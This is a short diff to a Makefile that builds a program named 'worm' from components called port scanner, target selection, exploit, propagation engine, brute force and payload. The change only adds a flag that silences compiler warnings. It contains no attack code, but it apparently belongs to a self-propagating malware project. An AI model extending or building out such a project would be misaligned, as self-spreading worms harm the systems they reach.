@@ -3,7 +3,7 @@
 all: worm
 
 worm: worm.o portscanner.o target_selection.o exploit.o propagation_engine.o bruteforce.o payload.o
-	$(CC) -o $@ $^
+	$(CC) -o $@ $^ -w
 
 clean:
 	$(RM) worm *.o *.txt
